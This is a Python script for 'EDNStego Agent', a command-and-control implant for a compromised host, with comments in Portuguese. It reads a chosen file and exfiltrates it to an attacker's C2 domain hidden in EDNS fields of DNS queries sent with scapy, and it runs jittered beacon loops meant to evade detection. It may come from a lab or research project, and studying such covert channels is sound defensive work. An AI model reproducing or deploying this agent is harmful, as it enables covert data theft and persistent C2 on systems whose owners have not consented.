#!/usr/bin/env python3
"""
EDNStego Agent — Agente C2 para host comprometido
Suporta todas as técnicas T1-T6 para exfiltração e beaconing.
"""

import argparse
import time
import random
import sys
import os

sys.path.insert(0, os.path.dirname(__file__))
from techniques import (t1_opt_option, t2_padding, t3_cookie,
                         t4_bufsize, t5_chain, t6_hybrid)
from scapy.all import send


def run_agent(args):
    print(f"[*] EDNStego Agent v1.0")
    print(f"[*] Server: {args.server}")
    print(f"[*] Resolver: {args.resolver}")
    print(f"[*] Mode: {args.mode}")

    if args.exfil:
        print(f"[*] Exfiltrating: {args.exfil}")
        if not os.path.exists(args.exfil):
            print(f"[!] Arquivo não encontrado: {args.exfil}")
            sys.exit(1)
        with open(args.exfil, 'rb') as f:
            data = f.read()
        print(f"[*] File size: {len(data)} bytes")
    else:
        data = None

    # Selecionar técnica
    if args.mode == 't1':
        if args.exfil:
            t1_opt_option.exfiltrate_file(
                args.exfil, args.server, args.resolver)
        else:
            _beacon_loop(args, t1_opt_option.build_query)

    elif args.mode == 't2':
        if args.exfil:
            t2_padding.exfiltrate_file(
                args.exfil, args.server, args.resolver,
                stealth=args.stealth)
        else:
            _beacon_loop(args, t2_padding.build_query)

    elif args.mode == 't3':
        if args.exfil:
            t3_cookie.exfiltrate_file(
                args.exfil, args.server, args.resolver)
        else:
            _beacon_loop(args, t3_cookie.build_query)

    elif args.mode == 't4':
        t4_bufsize.send_beacon(
            args.server, args.resolver,
            interval=args.interval, duration=args.duration)

    elif args.mode == 't5':
        if args.exfil:
            t5_chain.exfiltrate_file(
                args.exfil, args.server, args.resolver)
        else:
            _beacon_loop(args, t5_chain.build_query)

    elif args.mode == 't6':
        techniques = args.techniques.split(',') if args.techniques else ['t1', 't3', 't4']
        if args.exfil:
            t6_hybrid.exfiltrate_file(
                args.exfil, args.server, args.resolver,
                techniques=techniques)
        else:
            _beacon_hybrid(args, techniques)

    print("[+] Operação concluída!")


def _beacon_loop(args, build_fn):
    """Loop genérico de beacon para técnicas T1-T3, T5"""
    end_time = time.time() + args.duration
    count = 0

    print(f"[*] Beacon mode: interval={args.interval}s, "
          f"duration={args.duration}s")

    while time.time() < end_time:
        payload = f"BEACON:{count}:{time.time():.0f}".encode()
        subdomain = f"b{count}.{args.server}"
        pkt = build_fn(subdomain, payload, args.resolver)
        send(pkt, verbose=0)
        count += 1

        jitter = random.uniform(-args.interval * 0.2, args.interval * 0.2)
        time.sleep(max(0.5, args.interval + jitter))

    print(f"[*] Beacons enviados: {count}")


def _beacon_hybrid(args, techniques):
    """Beacon usando técnica híbrida T6"""
    end_time = time.time() + args.duration
    count = 0

    print(f"[*] Hybrid beacon: techniques={techniques}, "
          f"interval={args.interval}s")

    while time.time() < end_time:
        payload = f"HYBRID:{count}:{time.time():.0f}".encode()
        subdomain = f"h{count}.{args.server}"
        pkt = t6_hybrid.build_hybrid_query(
            subdomain, payload, args.resolver, techniques)
        send(pkt, verbose=0)
        count += 1

        jitter = random.uniform(-args.interval * 0.2, args.interval * 0.2)
        time.sleep(max(0.5, args.interval + jitter))

    print(f"[*] Hybrid beacons enviados: {count}")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='EDNStego Agent')
    parser.add_argument('--server', required=True, help='Domínio C2')
    parser.add_argument('--resolver', default='10.0.1.2',
                        help='Resolver DNS')
    parser.add_argument('--mode', required=True,
                        choices=['t1', 't2', 't3', 't4', 't5', 't6'],
                        help='Técnica de evasão')
    parser.add_argument('--exfil', help='Arquivo para exfiltrar')
    parser.add_argument('--techniques',
                        help='Técnicas para T6 (ex: t1,t3,t4)')
    parser.add_argument('--stealth', action='store_true',
                        help='Modo stealth para T2 (padding com zeros)')
    parser.add_argument('--interval', type=float, default=0.3,
                        help='Intervalo entre queries (segundos)')
    parser.add_argument('--duration', type=int, default=600,
                        help='Duração do teste em segundos')

    args = parser.parse_args()
    run_agent(args)
